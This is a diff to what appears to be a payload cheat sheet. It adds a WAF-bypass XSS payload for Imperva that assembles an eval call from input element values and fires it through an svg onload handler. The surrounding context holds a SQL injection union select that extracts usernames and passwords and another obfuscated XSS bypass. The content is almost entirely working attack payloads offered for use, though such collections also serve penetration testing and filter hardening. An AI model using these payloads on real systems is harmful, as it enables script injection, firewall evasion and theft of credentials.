@@ -3609,6 +3609,10 @@ amUserId=1 union select username,password,3,4 from users
 ```
 
 ### Imperva
+- [XSS Bypass](https://twitter.com/smaury92/status/1422599636800450572) by [@smaury92](https://twitter.com/smaury92)
+```html
+<input id='a'value='global'><input id='b'value='E'><input 'id='c'value='val'><input id='d'value='aler'><input id='e'value='t(documen'><input id='f'value='t.domain)'><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>
+```
 - [XSS Bypass](https://twitter.com/0xInfection/status/1420046446095519749) by [@0xInfection](https://twitter.com/0xInfection)
 ```html
 <x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme
